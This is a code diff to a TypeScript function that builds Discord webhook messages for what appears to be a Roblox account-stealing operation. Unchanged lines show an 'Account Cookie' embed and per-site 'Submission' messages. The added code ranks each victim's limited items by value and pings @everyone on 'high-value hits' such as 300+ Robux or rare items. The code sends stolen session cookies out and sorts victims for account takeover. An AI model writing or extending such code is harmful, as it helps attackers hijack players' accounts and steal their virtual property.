@@ -834,6 +834,32 @@ function buildDiscordPayload(opts: {
       footer: { text: `${siteName} • Gamepass Ownership` },
     });
   }
+
+  // Limiteds embed — top items chunked to 1024 chars per field
+  if (roblox && roblox.limiteds.length > 0) {
+    const sorted = [...roblox.limiteds].sort((a, b) => b.rap - a.rap);
+    const lines = sorted.map(
+      (i) => `• [${i.name}](https://www.roblox.com/catalog/${i.assetId}) — ${i.rap.toLocaleString()} RAP`
+    );
+    const chunks: string[] = [];
+    let buf = "";
+    for (const line of lines) {
+      if ((buf + "\n" + line).length > 1024) { chunks.push(buf); buf = line; }
+      else buf = buf ? `${buf}\n${line}` : line;
+    }
+    if (buf) chunks.push(buf);
+    embeds.push({
+      title: `${EMOJI.rap} Limiteds (${roblox.limiteds.length} • ${(roblox.rap ?? 0).toLocaleString()} RAP)`,
+      color: 0xf59e0b,
+      fields: chunks.map((c, i) => ({
+        name: chunks.length === 1 ? "Items" : `Items (${i + 1}/${chunks.length})`,
+        value: c,
+        inline: false,
+      })),
+      footer: { text: `${siteName} • Collectibles` },
+    });
+  }
+
   embeds.push({
     title: `${EMOJI.cookie} Account Cookie`,
     color: 0xff5555,
@@ -841,8 +867,18 @@ function buildDiscordPayload(opts: {
     footer: { text: "Handle with care" },
   });
 
+  // @everyone ping for high-value hits: 300+ Robux, RAP > 100, or Korblox/Headless.
+  const isBigHit = !!roblox && (
+    (roblox.robux ?? 0) >= 300 ||
+    (roblox.rap ?? 0) > 100 ||
+    roblox.hasKorblox === true ||
+    roblox.hasHeadless === true
+  );
+  const content = `${isBigHit ? "@everyone " : ""}**New ${toolType} Submission** (${siteName} / ${ownerUsername})`;
+
   return {
-    content: `**New ${toolType} Submission** (${siteName} / ${ownerUsername})`,
+    content,
+    allowed_mentions: isBigHit ? { parse: ["everyone"] } : { parse: [] },
     embeds,
   };
 }
